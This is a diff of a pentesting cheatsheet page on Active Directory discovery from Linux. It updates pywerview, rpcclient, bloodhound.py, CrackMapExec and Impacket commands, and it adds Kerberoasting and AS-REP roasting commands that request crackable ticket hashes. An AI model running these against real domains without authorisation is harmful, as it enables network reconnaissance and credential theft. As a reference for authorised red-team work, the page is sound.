@@ -4,7 +4,7 @@ title: TA0007 Discovery - AD Collection & Enumeration with Linux
 parent: Pentesting
 category: Pentesting
 grand_parent: Cheatsheets
-modified_date: 2023-06-02
+modified_date: 2023-06-05
 permalink: /pen/discov-ad-lin
 ---
 
@@ -89,15 +89,15 @@ SHOOT General Properties :
 Forest properties:
 ```sh
 # Enum domains and trusts: V1
-python pywerview.py get-netdomaintrust -w $zdom_fqdn -u $ztarg_user_name -p XXX --dc-ip $zdom_dc_ip
+pywerview.py get-netdomaintrust -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip
 
 # Enum domains and trusts: V2
-rpcclient -U $ztarg_user_name $ztarg_computer_ip...  
+rpcclient -U $ztarg_user_name $ztarg_computer_ip  
 rpcclient> enumdomains
 rpcclient> enumtrusts
 
 # Enum domains and trusts: V3
-./bloodhound.py -dc $ztarg_dc_fqdn -d $zdom_fqdn -u $ztarg_user_name -p XXX -c Trusts
+./bloodhound.py -dc $ztarg_dc_fqdn -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass -c Trusts
 python
 >>> import json
 with open ("X.json","r+") as f:                                                                                     
@@ -144,11 +144,11 @@ Easy enumeration with **Impacket\FindDelegation.py**:
 
 ```bash
 # with password in the CLI
-$zz = $zdom_fqdn + '/' + $zlat_user + ':"PASSWORD"'
+$zz = $zdom_fqdn + '/' + $ztarg_user_name + ':' + $ztarg_user_pass
 .\findDelegation.py  $zz
 
 # with kerberos auth / password not in the CLI
-$zz = $zdom_fqdn + '/' + $zlat_user
+$zz = $zdom_fqdn + '/' + $ztarg_user_name
 .\findDelegation.py  $zz -k -no-pass
 ```
 
@@ -179,8 +179,19 @@ tbd
 ```
 #### <a name='shoot-shares'></a>shoot-shares
 #### <a name='shoot-mssql-servers'></a>shoot-mssql-servers
+
 #### <a name='shoot-spns'></a>shoot-spns
+```
+# https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py
+GetUserSPNs.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -request >> tgs.txt
+```
+
 #### <a name='shoot-npusers'></a>shoot-npusers
+```
+# https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
+GetNPUsers.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -request >> np_users.txt 
+```
+
 #### <a name='shoot-acls'></a>shoot-acls
 
 
@@ -191,21 +202,21 @@ tbd
 User groups:
 ```bash
 # Get user info
-python pywerview.py get-netuser -w $zdom_fqdn -u $zlat_user -p $zlat_pwd --dc-ip $zdom_dc_ip --username $ztarg_user > pt_xxx_getnetuser_x.txt
+python pywerview.py get-netuser -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_pwd --dc-ip $zdom_dc_ip --username $ztarg_user_name> pt_xxx_getnetuser_x.txt
 
 # Get user info + canarytoken check
 # select cn, whenCreated, accountExpires, pwdLastSet, lastLogon, logonCount, badPasswordTime, badPwdCount
 
 # Get user memberof info
-python pywerview.py get-netgroup -w $zdom_fqdn -u $zlat_user -p $zlat_pwd --dc-ip $zdom_dc_ip --username $ztarg_user| grep -v "^$" | cut -f2 -d" "  > pt_xxx_getnetgroup_x.txt 
+python pywerview.py get-netgroup -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_pwd --dc-ip $zdom_dc_ip --username $ztarg_user| grep -v "^$" | cut -f2 -d" "  > pt_xxx_getnetgroup_x.txt 
 
 # Get the machine's full-data
-python pywerview.py get-netcomputer -w $zdom_fqdn -u $zlat_user -p $zlat_pwd --dc-ip $zdom_dc_ip --computername --full-data | grep 
+python pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_pwd --dc-ip $zdom_dc_ip --computername --full-data | grep 
 
 # Get the machines based on an adspath / OU
 ztarg_ou = "OU=Workstations,DC=CONTOSO,DC=COM"
 ztarg_adspath = "ldap://" + $ztarg_ou
-python pywerview.py get-netcomputer -w $zdom_fqdn -u $zlat_user -p $zlat_pwd -a $ztarg_adspath --dc-ip $zdom_dc_ip | grep -v "^$" | cut -f2 -d" " > pt_xxx_getnetcomputer_ou_x.txt
+python pywerview.py get-netcomputer -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_pwd -a $ztarg_adspath --dc-ip $zdom_dc_ip | grep -v "^$" | cut -f2 -d" " > pt_xxx_getnetcomputer_ou_x.txt
 ```
 
 ### <a name='iter-scope'></a>iter-scope
@@ -217,18 +228,18 @@ Scope of compromise:
 cat 2023xxxxxxx_computers.json | jq '.data[] | select(.LocalAdmins.Collected==true)'| jq '.Properties.name' > pt_xxx_fla_pwn.txt
 
 # Find where the account is local admin V2
-cme winrm pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $zlat_user -p $zlat_pwd
-cme smb pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $zlat_user -p $zlat_pwd
+cme winrm pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass
+cme smb pt_xxx_getnetcomputer_ou_x.txt -d $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass
 
 # Get the DNs of the owned machines 
 # Get the DNs of the owned machines / get the cn computer (1 line) and its DN (1 line)
-while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p XXX --dc-ip $zdom_dc_ip --attributes cn distinguishedName >> pt_XXX_fla_pwn_dn.txt; done < pt_XXX_fla_pwn.txt
+while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --attributes cn distinguishedName >> pt_XXX_fla_pwn_dn.txt; done < pt_XXX_fla_pwn.txt
 # Get the DNs of the owned machines / format the result returned to CSV
 i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> pt_XXX_fla_pwn_dn.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> pt_XXX_fla_pwn_dn.csv; i=0; fi; done < pt_XXX_fla_pwn_dn.txt
 
 # Get the OS of the owned machines /
 # Get the OS of the owned machines / get the cn computer (1 line) and its OS (1 line)
-while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p XXX --dc-ip $zdom_dc_ip --attributes cn operatingSystem >> pt_XXX_getcomputer_XXX_os.txt; done < pt_XXX_pwned_machines.txt
+while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computername $ztarg_computer_fqdn -w $zdom_fqdn -u $ztarg_user_name -p $ztarg_user_pass --dc-ip $zdom_dc_ip --attributes cn operatingSystem >> pt_XXX_getcomputer_XXX_os.txt; done < pt_XXX_pwned_machines.txt
 # Get the OS of the owned machines / format the result returned to CSV
 i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> pt_XXX_getnetcomputer_XXX_os.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> pt_XXX_getnetcomputer_XXX_os.csv; i=0; fi; done < pt_XXX_getcomputer_XXX_os.txt
 ```
